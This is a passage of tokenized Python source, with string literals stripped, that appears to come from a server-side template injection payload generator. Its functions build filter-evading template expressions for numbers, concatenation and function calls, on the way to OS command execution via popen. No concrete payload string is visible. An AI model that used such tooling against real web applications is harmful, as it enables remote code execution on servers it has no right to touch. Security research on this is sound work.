EVAL_FUNC , <EOL> EVAL , <EOL> CONFIG , <EOL> MODULE_OS , <EOL> OS_POPEN_OBJ , <EOL> OS_POPEN_READ , <EOL> ) : <EOL> logger . info ( <EOL> "<STR_LIT>" . format ( <EOL> great = colored ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> gen_type = colored ( "<STR_LIT>" , gen_type , bold = True ) , <EOL> args_repl = colored ( <EOL> "<STR_LIT>" , "<STR_LIT>" . join ( repr ( arg ) for arg in args ) <EOL> ) , <EOL> ) <EOL> ) <EOL> self . cache_by_repr [ gen_req ] = ret <EOL> self . used_count [ gen . __name__ ] += <NUM_LIT> <EOL> return ret <EOL> if gen_type not in ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ATTRIBUTE , <EOL> ITEM , <EOL> PLUS , <EOL> MULTIPLY , <EOL> STRING_CONCAT , <EOL> MOD , <EOL> STRING_CONCATMANY , <EOL> VARIABLE_OF , <EOL> ENCLOSE , <EOL> ENCLOSE_UNDER , <EOL> ) : <EOL> logger . info ( <EOL> "<STR_LIT>" . format ( <EOL> failed = colored ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> gen_type = gen_type , <EOL> args_repl = "<STR_LIT>" . join ( repr ( arg ) for arg in args ) , <EOL> ) <EOL> ) <EOL> self . cache_by_repr [ gen_req ] = None <EOL> return None <EOL> def generate ( self , gen_type , * args ) -> Union [ str , None ] : <EOL> result = self . generate_by_list ( [ ( gen_type , * args ) ] ) <EOL> if result is None : <EOL> return None <EOL> s , _ , _ = result <EOL> return s <EOL> def generate_detailed ( self , gen_type , * args ) -> Union [ PayloadGeneratorResult , None ] : <EOL> result = self . generate_by_list ( [ ( gen_type , * args ) ] ) <EOL> if result is None : <EOL> return None <EOL> return result <EOL> def delete_from_cache ( self , gen_type , * args ) : <EOL> if ( gen_type , * args ) in self . cache_by_repr : <EOL> del self . cache_by_repr [ ( gen_type , * args ) ] <EOL> @ expression_gen <EOL> def gen_variable_of_context ( context : dict , var_value ) : <EOL> variables = [ name for name , value in context . items ( ) if value == var_value ] <EOL> if not variables : <EOL> return [ ( UNSATISFIED , ) ] <EOL> targets_list = [ [ ( LITERAL , v ) , ( WITH_CONTEXT_VAR , v ) ] for v in variables ] <EOL> return [ ( ONEOF , * targets_list ) ] <EOL> @ expression_gen <EOL> def gen_enclose_normal ( context : dict , target ) : <EOL> return [ <EOL> ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) , target , ( LITERAL , "<STR_LIT>" ) ] ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_concat_plus ( context : dict , a , b ) : <EOL> return [ ( PLUS , a , b ) ] <EOL> @ expression_gen <EOL> def gen_string_concat_tilde ( context : dict , a , b ) : <EOL> target_list = [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , a ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , b ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_concat_format ( context : dict , a , b ) : <EOL> target_list = [ <EOL> ( ONEOF , [ ( LITERAL , "<STR_LIT>" ) ] , [ ( LITERAL , '<STR_LIT>' ) ] , [ ( VARIABLE_OF , "<STR_LIT>" ) ] ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> a , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> b , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_concatmany_onebyone ( context : dict , parts ) : <EOL> answer = parts [ <NUM_LIT> ] <EOL> for part in parts [ <NUM_LIT> : ] : <EOL> answer = ( STRING_CONCAT , answer , part ) <EOL> return [ answer ] <EOL> @ expression_gen <EOL> def gen_string_concatmany_join ( context : dict , parts ) : <EOL> target_list = ( <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + join_target ( sep = ( LITERAL , "<STR_LIT>" ) , targets = parts ) <EOL> + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_concatmany_lipsumglobals1 ( context : dict , parts ) : <EOL> target_list = ( <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + join_target ( sep = ( LITERAL , "<STR_LIT>" ) , targets = parts ) <EOL> + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_concatmany_lipsumglobals2 ( context : dict , parts ) : <EOL> return [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> * join_target ( sep = ( LITERAL , "<STR_LIT>" ) , targets = parts ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_concatmany_lipsumglobals3 ( context : dict , parts ) : <EOL> return [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> * join_target ( sep = ( LITERAL , "<STR_LIT>" ) , targets = parts ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> @ expression_gen <EOL> def gen_plus_normal ( context : dict , a , b ) : <EOL> a = ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , a ) <EOL> b = ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , b ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ a , ( LITERAL , "<STR_LIT>" ) , b ] ) ] <EOL> @ expression_gen <EOL> def gen_plus_addfunc ( context : dict , a , b ) : <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , a ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> b , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_plus_addfuncbyfilter ( context : dict , a , b ) : <EOL> get_add_func = ( <EOL> ONEOF , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , '<STR_LIT>' ) ] , <EOL> [ ( LITERAL , '<STR_LIT>' ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) , ( VARIABLE_OF , "<STR_LIT>" ) , ( LITERAL , "<STR_LIT>" ) ] , <EOL> ) <EOL> logger . debug ( "<STR_LIT>" , repr ( a ) ) <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , a ) , <EOL> get_add_func , <EOL> b , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_mod_normal ( context : dict , a , b ) : <EOL> a = ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , a ) <EOL> b = ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , b ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ a , ( LITERAL , "<STR_LIT>" ) , b ] ) ] <EOL> @ expression_gen <EOL> def gen_mod_func ( context : dict , a , b ) : <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , a ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> b , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_mod_func2 ( context : dict , a , b ) : <EOL> mod_func = ( <EOL> ONEOF , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , '<STR_LIT>' ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) , ( VARIABLE_OF , "<STR_LIT>" ) , ( LITERAL , "<STR_LIT>" ) ] , <EOL> ) <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , a ) , <EOL> mod_func , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> b , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_function_call_forattr ( context : dict , function_target , args_target_list ) : <EOL> target_list = ( <EOL> [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , function_target ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + join_target ( ( LITERAL , "<STR_LIT>" ) , args_target_list ) <EOL> + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_function_call_forattr2 ( context : dict , function_target , args_target_list ) : <EOL> target_list = ( <EOL> [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , function_target ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + join_target ( ( LITERAL , "<STR_LIT>" ) , args_target_list ) <EOL> + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_function_call_forfilter1 ( context : dict , function_target , args_target_list ) : <EOL> target_list = ( <EOL> [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , function_target ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + join_target ( ( LITERAL , "<STR_LIT>" ) , args_target_list ) <EOL> + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_function_call_forfilter2 ( context : dict , function_target , args_target_list ) : <EOL> target_list = ( <EOL> [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , function_target ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + join_target ( ( LITERAL , "<STR_LIT>" ) , args_target_list ) <EOL> + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_multiply_normal ( context : dict , a , b ) : <EOL> a = ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , a ) <EOL> b = ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , b ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ a , ( LITERAL , "<STR_LIT>" ) , b ] ) ] <EOL> @ expression_gen <EOL> def gen_multiply_func ( context : dict , a , b ) : <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , a ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> b , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_multiply_func2 ( context : dict , a , b ) : <EOL> mul_func = ( <EOL> ONEOF , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , '<STR_LIT>' ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) , ( VARIABLE_OF , "<STR_LIT>" ) , ( LITERAL , "<STR_LIT>" ) ] , <EOL> ) <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , a ) , <EOL> mul_func , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> b , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_formular_sum_simplesum ( context , num_targets ) : <EOL> target_list = join_target ( sep = ( LITERAL , "<STR_LIT>" ) , targets = num_targets ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_formular_sum_tuplesum ( context , num_targets ) : <EOL> if len ( num_targets ) == <NUM_LIT> : <EOL> return [ num_targets [ <NUM_LIT> ] ] <EOL> target_list = ( <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + join_target ( sep = ( LITERAL , "<STR_LIT>" ) , targets = num_targets ) <EOL> + [ ( LITERAL , "<STR_LIT>" ) ] <EOL> ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_formular_sum_add ( context , num_targets ) : <EOL> final_target = num_targets [ <NUM_LIT> ] <EOL> for target in num_targets [ <NUM_LIT> : ] : <EOL> final_target = ( PLUS , final_target , target ) <EOL> return [ final_target ] <EOL> @ expression_gen <EOL> def gen_zero_literal ( context : dict ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) ] <EOL> @ expression_gen <EOL> def gen_zero_2 ( context : dict ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) ] <EOL> @ expression_gen <EOL> def gen_zero_3 ( context : dict ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) ] <EOL> @ expression_gen <EOL> def gen_zero_4 ( context : dict ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) ] <EOL> @ expression_gen <EOL> def gen_zero_cycler ( context : dict ) : <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" ) ] ) ] <EOL> @ expression_gen <EOL> def gen_zero_cycler2 ( context : dict ) : <EOL> targets = [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( ONEOF , [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( LITERAL , '<STR_LIT>' ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ] ) , <EOL> ( LITERAL , "<STR_LIT>" ) <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , targets ) ] <EOL> @ expression_gen <EOL> def gen_zero_emptylength ( context : dict ) : <EOL> empty_things = [ <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , '<STR_LIT>' ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> ] <EOL> get_length = [ <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> ] <EOL> target_list = [ ( ONEOF , * empty_things ) , ( ONEOF , * get_length ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_simple ( context : dict , value : int ) : <EOL> if value < <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , str ( value ) ) ] ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_hex ( context : dict , value : int ) : <EOL> if value < <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , hex ( value ) ) ] ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_underline ( context : dict , value : int ) : <EOL> if value < <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , "<STR_LIT>" . join ( str ( value ) ) ) ] ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_unicode ( context : dict , value : int ) : <EOL> if value <= <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> payload_targets = [ <EOL> [ ( LITERAL , payload ) ] for payload in transform_int_chars_unicode ( str ( value ) [ <NUM_LIT> : ] ) <EOL> ] <EOL> return [ <EOL> ( REQUIRE_PYTHON3 , ) , <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> [ ( LITERAL , str ( value ) [ <NUM_LIT> ] ) , ( ONEOF , * payload_targets ) ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_positive_integer_unicodehex ( context : dict , value : int ) : <EOL> if value <= <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> value_hex_literal = hex ( value ) [ <NUM_LIT> : ] <EOL> payload_targets = [ <EOL> [ ( LITERAL , payload ) ] <EOL> for payload in transform_int_chars_unicode ( value_hex_literal ) <EOL> ] <EOL> targets_list = [ ( LITERAL , "<STR_LIT>" ) , ( ONEOF , * payload_targets ) ] <EOL> return [ ( REQUIRE_PYTHON3 , ) , ( EXPRESSION , precedence [ "<STR_LIT>" ] , targets_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_hexunderline ( context : dict , value : int ) : <EOL> if value < <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> digits = hex ( value ) [ <NUM_LIT> : ] <EOL> literal = "<STR_LIT>" . format ( "<STR_LIT>" . join ( digits ) ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , literal ) ] ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_octunderline ( context : dict , value : int ) : <EOL> if value < <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> digits = oct ( value ) [ <NUM_LIT> : ] <EOL> literal = "<STR_LIT>" . format ( "<STR_LIT>" . join ( digits ) ) <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , literal ) ] ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_sum ( context : dict , value : int ) : <EOL> if value < <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> ints = [ <EOL> ( var_name , var_value ) <EOL> for var_name , var_value in context . items ( ) <EOL> if isinstance ( var_value , int ) and var_value > <NUM_LIT> <EOL> ] <EOL> if ints == [ ] : <EOL> return [ ( UNSATISFIED , ) ] <EOL> ints . sort ( key = lambda pair : pair [ <NUM_LIT> ] , reverse = True ) <EOL> value_left = value <EOL> payload_vars = [ ] <EOL> while value_left != <NUM_LIT> : <EOL> while ints and ints [ <NUM_LIT> ] [ <NUM_LIT> ] > value_left : <EOL> ints = ints [ <NUM_LIT> : ] <EOL> if not ints : <EOL> return [ ( UNSATISFIED , ) ] <EOL> value_left -= ints [ <NUM_LIT> ] [ <NUM_LIT> ] <EOL> payload_vars . append ( ints [ <NUM_LIT> ] [ <NUM_LIT> ] ) <EOL> ints = [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( LITERAL , v ) ] ) for v in payload_vars ] <EOL> return [ ( FORMULAR_SUM , ints ) ] + [ ( WITH_CONTEXT_VAR , v ) for v in payload_vars ] <EOL> @ expression_gen <EOL> def gen_positive_integer_recurmulitiply ( context : dict , value : int ) : <EOL> xs = [ x for x in range ( <NUM_LIT> , value // <NUM_LIT> ) if value % x == <NUM_LIT> ] <EOL> xs . sort ( key = lambda x : max ( x , value // x ) ) <EOL> if xs == [ ] or value < <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ <EOL> ( <EOL> ONEOF , <EOL> * [ <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( POSITIVE_INTEGER , value // x ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( POSITIVE_INTEGER , x ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> for x in xs <EOL> ] , <EOL> ) <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_recurmultiply2 ( context : dict , value : int ) : <EOL> if value <= <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> alternatives = [ ] <EOL> for i in range ( <NUM_LIT> , <NUM_LIT> , - <NUM_LIT> ) : <EOL> lst = [ ( LITERAL , "<STR_LIT>" ) , ( POSITIVE_INTEGER , value % i ) ] if value % i != <NUM_LIT> else [ ] <EOL> alternative = ( <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( POSITIVE_INTEGER , value // i ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( POSITIVE_INTEGER , i ) , <EOL> ] <EOL> + lst <EOL> + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> ) <EOL> alternatives . append ( alternative ) <EOL> if not alternatives : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ ( ONEOF , * alternatives ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_recurmulnoastral ( context : dict , value : int ) : <EOL> if value <= <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> alternatives = [ ] <EOL> pieces_max = int ( math . sqrt ( value ) ) + <NUM_LIT> <EOL> for i in range ( <NUM_LIT> , pieces_max ) : <EOL> a , b = ( value // i ) , ( value % i ) <EOL> if a > pieces_max : <EOL> continue <EOL> if b == <NUM_LIT> : <EOL> alternative = [ ( MULTIPLY , ( POSITIVE_INTEGER , a ) , ( POSITIVE_INTEGER , i ) ) ] <EOL> alternatives . insert ( <NUM_LIT> , alternative ) <EOL> else : <EOL> alternative = [ <EOL> ( <EOL> PLUS , <EOL> ( MULTIPLY , ( POSITIVE_INTEGER , a ) , ( POSITIVE_INTEGER , i ) ) , <EOL> ( POSITIVE_INTEGER , b ) , <EOL> ) <EOL> ] <EOL> alternatives . append ( alternative ) <EOL> if not alternatives : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ ( ONEOF , * alternatives ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_dictlength ( context : dict , value : int ) : <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" * value ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_cycleritemlength ( context : dict , value : int ) : <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( "<STR_LIT>" * value ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_length ( context : dict , value : int ) : <EOL> lengthy_tuples_zero = ( <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + join_target ( ( LITERAL , "<STR_LIT>" ) , [ ( ZERO , ) for _ in range ( value ) ] ) <EOL> + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> ) <EOL> lengthy_tuples_x = ( <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> + [ <EOL> ( <EOL> ONEOF , <EOL> * [ <EOL> join_target ( <EOL> ( LITERAL , "<STR_LIT>" ) , [ ( LITERAL , chr ( c ) ) for _ in range ( value ) ] <EOL> ) <EOL> for c in range ( ord ( "<STR_LIT>" ) , ord ( "<STR_LIT>" ) + <NUM_LIT> ) <EOL> ] , <EOL> ) <EOL> ] <EOL> + [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> ) <EOL> target_list = [ <EOL> ( ONEOF , lengthy_tuples_x , lengthy_tuples_zero ) , <EOL> ( <EOL> ONEOF , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> [ ( LITERAL , "<STR_LIT>" ) ] , <EOL> ) , <EOL> ] <EOL> return [ <EOL> ( <EOL> EXPRESSION , <EOL> precedence [ "<STR_LIT>" ] , <EOL> target_list , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_positive_integer_numbersum1 ( context : dict , value : int ) : <EOL> if value < <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> alternative = [ ] <EOL> for i in range ( min ( <NUM_LIT> , value - <NUM_LIT> ) , <NUM_LIT> , - <NUM_LIT> ) : <EOL> if value % i != <NUM_LIT> : <EOL> numbers = [ str ( i ) ] * ( value // i ) + [ str ( value % i ) ] <EOL> else : <EOL> numbers = [ str ( i ) ] * ( value // i ) <EOL> inner = "<STR_LIT>" . join ( numbers ) <EOL> alternative . append ( [ ( LITERAL , inner ) ] ) <EOL> target_list = [ ( ONEOF , * alternative ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_numbersum2 ( context : dict , value : int ) : <EOL> if value < <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> alternatives = [ ] <EOL> for i in range ( min ( <NUM_LIT> , value - <NUM_LIT> ) , <NUM_LIT> , - <NUM_LIT> ) : <EOL> if value % i != <NUM_LIT> : <EOL> numbers = [ str ( i ) ] * ( value // i ) + [ str ( value % i ) ] <EOL> else : <EOL> numbers = [ str ( i ) ] * ( value // i ) <EOL> inner = "<STR_LIT>" . join ( numbers ) <EOL> alternatives . append ( [ ( LITERAL , "<STR_LIT>" . format ( inner ) ) ] ) <EOL> target_list = [ ( ONEOF , * alternatives ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_count ( context : dict , value : int ) : <EOL> s = "<STR_LIT>" . join ( "<STR_LIT>" * value ) <EOL> if value == <NUM_LIT> : <EOL> s += "<STR_LIT>" <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( s ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_onesum1 ( context : dict , value : int ) : <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( [ "<STR_LIT>" ] * value ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_onesum2 ( context : dict , value : int ) : <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( [ "<STR_LIT>" ] * value ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_truesum1 ( context : dict , value : int ) : <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( [ "<STR_LIT>" ] * value ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_truesum2 ( context : dict , value : int ) : <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( [ "<STR_LIT>" ] * value ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_bool ( context : dict , value : int ) : <EOL> if value not in ( <NUM_LIT> , <NUM_LIT> ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ ( LITERAL , str ( value == <NUM_LIT> ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_positive_integer_indexoftrue ( 